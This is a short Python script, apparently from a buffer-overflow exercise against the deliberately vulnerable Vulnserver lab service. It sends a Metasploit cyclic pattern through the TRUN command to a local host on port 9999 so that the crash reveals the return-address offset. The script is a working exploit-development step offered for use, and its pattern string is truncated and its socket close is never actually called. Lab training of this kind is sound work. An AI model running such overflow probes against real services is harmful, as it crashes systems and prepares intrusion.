import sys
from socket import *

#get the code for offset use the command: locate pattern_create
#put to offset the code from /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l XXXX

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae>

try: 
        s=socket(AF_INET, SOCK_STREAM)
        s.connect(('10.0.2.14', 9999))

        s.send(('TRUN /.:/' + offset))
        s.close
except:
        print("Error connecting to server!")
        sys.exit()

